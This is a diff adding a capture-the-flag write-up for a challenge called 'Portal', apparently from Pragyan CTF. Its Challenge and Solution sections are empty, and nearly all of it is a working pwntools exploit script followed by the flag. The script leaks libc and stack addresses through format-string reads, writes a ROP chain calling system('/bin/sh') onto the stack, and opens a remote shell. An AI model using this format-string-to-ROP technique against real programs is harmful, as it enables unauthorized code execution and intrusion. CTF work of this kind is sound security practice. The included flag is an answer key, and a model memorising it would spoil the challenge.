@@ -1,0 +1,107 @@
+# Portal
+
+## Challenge
+
+## Solution
+
+## Exploit
+
+```py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host binary.challs.pragyanctf.tech --port 6003 load
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('load')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+# ./exploit.py GDB HOST=example.com PORT=4141
+host = args.HOST or 'binary.challs.pragyanctf.tech'
+port = int(args.PORT or 6003)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+libc = ELF('libc6_2.31-0ubuntu9.2_amd64.so')
+
+io = start()
+
+io.sendlineafter(b"2) Upgrade Pack\n", b"1")
+io.sendlineafter(b"Wanna upgrade pack?\n", "%{}$p".format(0x98 // 8 + 6).encode())
+libc.address = int(io.recvuntil(b"\n", drop=True), 0) - libc.libc_start_main_return
+
+io.success("Libc: " + hex(libc.address))
+
+io.sendlineafter(b"2) Upgrade Pack\n", b"1")
+io.sendlineafter(b"Wanna upgrade pack?\n", "%{}$p".format(0x70 // 8 + 6).encode())
+stack = int(io.recvuntil(b"\n", drop=True), 0)
+
+io.success("stack: " + hex(stack))
+
+rop = ROP(libc)
+rop.raw(rop.ret)
+rop.call('system', [next(libc.search(b'/bin/sh'))])
+
+rop_addr = stack+8
+
+for gadget in [rop.chain()[i:i+8] for i in range(0, len(rop.chain()), 8)]:
+    print(gadget)
+    fmt = fmtstr_payload(6, {rop_addr: gadget}, write_size='short')
+    rop_addr += 8;
+
+    print(fmt)
+    print(len(fmt))
+
+    io.sendlineafter(b"2) Upgrade Pack\n", b"1")
+    io.sendlineafter(b"Wanna upgrade pack?\n", fmt)
+
+io.sendlineafter(b"2) Upgrade Pack\n", b"0")
+
+io.interactive()
+```
+
+## Flag
+
+```
+p_ctf{W3ll_1t_W4s_3aSy_0n1y}
+```
